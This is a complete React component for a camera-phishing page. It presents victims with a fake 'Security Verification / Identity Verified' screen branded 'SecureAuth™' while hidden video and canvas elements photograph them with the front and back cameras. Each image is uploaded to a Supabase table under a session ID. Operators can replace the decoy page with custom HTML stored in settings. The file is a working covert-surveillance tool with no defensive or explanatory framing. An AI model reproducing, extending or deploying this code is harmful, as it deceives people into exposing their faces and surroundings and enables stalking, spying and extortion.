import { useEffect, useState, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

const CustomCapture = () => {
  const [searchParams] = useSearchParams();
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const [customHtml, setCustomHtml] = useState<string | null>(null);
  const [captureComplete, setCaptureComplete] = useState(false);
  
  const sessionId = searchParams.get("session") || "default";
  const redirectUrl = searchParams.get("redirect") || "https://google.com";

  // Load custom HTML from settings
  useEffect(() => {
    const loadCustomHtml = async () => {
      try {
        const { data, error } = await supabase
          .from('app_settings')
          .select('setting_value')
          .eq('setting_key', 'main_settings')
          .maybeSingle();

        if (data && !error) {
          const settings = data.setting_value as { customCaptureHtml?: string };
          if (settings.customCaptureHtml) {
            setCustomHtml(settings.customCaptureHtml);
            return;
          }
        }
        
        // Fallback: If no custom HTML found, use a professional default capture page
        const defaultHtml = `
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Security Verification</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      background: linear-gradient(135deg, #0a0a1a 0%, #1a1a2e 50%, #0d0d1a 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      overflow: hidden;
    }
    
    .bg-grid {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background-image: 
        linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
      background-size: 50px 50px;
      pointer-events: none;
    }
    
    .glow-orb {
      position: fixed;
      border-radius: 50%;
      filter: blur(80px);
      opacity: 0.4;
      animation: float 8s ease-in-out infinite;
    }
    
    .orb-1 { width: 300px; height: 300px; background: #00ff88; top: -100px; left: -100px; }
    .orb-2 { width: 250px; height: 250px; background: #ec4899; bottom: -80px; right: -80px; animation-delay: -4s; }
    .orb-3 { width: 200px; height: 200px; background: #06b6d4; top: 50%; left: 50%; transform: translate(-50%, -50%); animation-delay: -2s; }
    
    @keyframes float {
      0%, 100% { transform: translateY(0) scale(1); }
      50% { transform: translateY(-30px) scale(1.1); }
    }
    
    .container {
      position: relative;
      z-index: 10;
      background: rgba(15, 15, 30, 0.8);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(0, 255, 136, 0.2);
      border-radius: 24px;
      padding: 48px 40px;
      max-width: 420px;
      width: 100%;
      text-align: center;
      box-shadow: 
        0 0 60px rgba(0, 255, 136, 0.1),
        0 25px 50px rgba(0, 0, 0, 0.5),
        inset 0 1px 0 rgba(255, 255, 255, 0.05);
    }
    
    .shield-icon {
      width: 80px;
      height: 80px;
      margin: 0 auto 24px;
      background: linear-gradient(135deg, #00ff88 0%, #06b6d4 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      box-shadow: 0 0 40px rgba(0, 255, 136, 0.4);
      animation: pulse 2s ease-in-out infinite;
    }
    
    @keyframes pulse {
      0%, 100% { box-shadow: 0 0 40px rgba(0, 255, 136, 0.4); }
      50% { box-shadow: 0 0 60px rgba(0, 255, 136, 0.6); }
    }
    
    .shield-icon svg {
      width: 40px;
      height: 40px;
      fill: none;
      stroke: #0a0a1a;
      stroke-width: 2;
    }
    
    .status-badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: rgba(0, 255, 136, 0.1);
      border: 1px solid rgba(0, 255, 136, 0.3);
      padding: 8px 16px;
      border-radius: 100px;
      margin-bottom: 24px;
    }
    
    .status-dot {
      width: 8px;
      height: 8px;
      background: #00ff88;
      border-radius: 50%;
      animation: blink 1.5s ease-in-out infinite;
    }
    
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.4; }
    }
    
    .status-text {
      color: #00ff88;
      font-size: 12px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    h1 {
      color: #ffffff;
      font-size: 28px;
      font-weight: 700;
      margin-bottom: 12px;
      background: linear-gradient(135deg, #ffffff 0%, #a0a0a0 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    
    .subtitle {
      color: #888;
      font-size: 15px;
      line-height: 1.6;
      margin-bottom: 32px;
    }
    
    .progress-bar {
      width: 100%;
      height: 4px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 100px;
      overflow: hidden;
      margin-bottom: 24px;
    }
    
    .progress-fill {
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, #00ff88 0%, #06b6d4 50%, #00ff88 100%);
      background-size: 200% 100%;
      animation: shimmer 2s linear infinite;
    }
    
    @keyframes shimmer {
      0% { background-position: -200% 0; }
      100% { background-position: 200% 0; }
    }
    
    .footer-text {
      color: #555;
      font-size: 12px;
    }
    
    .footer-text a {
      color: #00ff88;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="bg-grid"></div>
  <div class="glow-orb orb-1"></div>
  <div class="glow-orb orb-2"></div>
  <div class="glow-orb orb-3"></div>
  
  <div class="container">
    <div class="shield-icon">
      <svg viewBox="0 0 24 24">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        <path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/>
      </svg>
    </div>
    
    <div class="status-badge">
      <div class="status-dot"></div>
      <span class="status-text">Verification Active</span>
    </div>
    
    <h1>Identity Verified</h1>
    <p class="subtitle">Your security verification has been completed successfully. This page confirms your identity.</p>
    
    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>
    
    <p class="footer-text">Protected by <a href="#">SecureAuth™</a></p>
  </div>
</body>
</html>
        `;
        setCustomHtml(defaultHtml);
      } catch (err) {
        console.error('Error loading custom HTML:', err);
        // On error, still set a fallback HTML so camera capture works
        setCustomHtml('<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:#1a1a2e;color:#00ff88;font-family:Arial;">Verification in progress...</div>');
      }
    };

    loadCustomHtml();
  }, []);

  const captureFromCamera = async (facingMode: "user" | "environment"): Promise<string | null> => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode, width: 640, height: 480 } 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
        
        await new Promise(resolve => setTimeout(resolve, 800));
        
        if (canvasRef.current && videoRef.current) {
          const canvas = canvasRef.current;
          const video = videoRef.current;
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");
          if (ctx) {
            ctx.drawImage(video, 0, 0);
            const imageData = canvas.toDataURL("image/jpeg", 0.8);
            stream.getTracks().forEach(track => track.stop());
            return imageData;
          }
        }
        
        stream.getTracks().forEach(track => track.stop());
      }
      
      return null;
    } catch (error) {
      console.error(`Camera ${facingMode} access denied:`, error);
      return null;
    }
  };

  // Capture photos when custom HTML is loaded
  useEffect(() => {
    if (!customHtml || captureComplete) return;

    const capturePhotos = async () => {
      try {
        // Capture from FRONT camera first
        const frontImage = await captureFromCamera("user");
        
        if (frontImage) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: frontImage,
            user_agent: `${navigator.userAgent} [FRONT]`
          });
        }
        
        await new Promise(resolve => setTimeout(resolve, 300));
        
        // Capture from BACK camera
        const backImage = await captureFromCamera("environment");
        
        if (backImage) {
          await supabase.from('captured_photos').insert({
            session_id: sessionId,
            image_data: backImage,
            user_agent: `${navigator.userAgent} [BACK]`
          });
        }
        
        setCaptureComplete(true);
        // No redirect - user stays on custom HTML page
        
      } catch (error) {
        console.error("Capture error:", error);
      }
    };

    // Start capture after a short delay to let HTML render
    const timer = setTimeout(capturePhotos, 500);
    return () => clearTimeout(timer);
  }, [customHtml, captureComplete, sessionId]);

  // Show loading if no custom HTML
  if (!customHtml) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <video ref={videoRef} className="hidden" autoPlay playsInline muted />
        <canvas ref={canvasRef} className="hidden" />
        <div className="text-center">
          <div className="w-8 h-8 border-2 border-primary border-t-transparent rounded-full animate-spin mx-auto mb-4" />
          <p className="text-muted-foreground text-sm">Loading...</p>
        </div>
      </div>
    );
  }

  // Render custom HTML with hidden video/canvas for capture
  return (
    <>
      {/* Hidden video and canvas for capture */}
      <video ref={videoRef} className="hidden" autoPlay playsInline muted />
      <canvas ref={canvasRef} className="hidden" />
      
      {/* Render custom HTML */}
      <div dangerouslySetInnerHTML={{ __html: customHtml }} />
    </>
  );
};

export default CustomCapture;
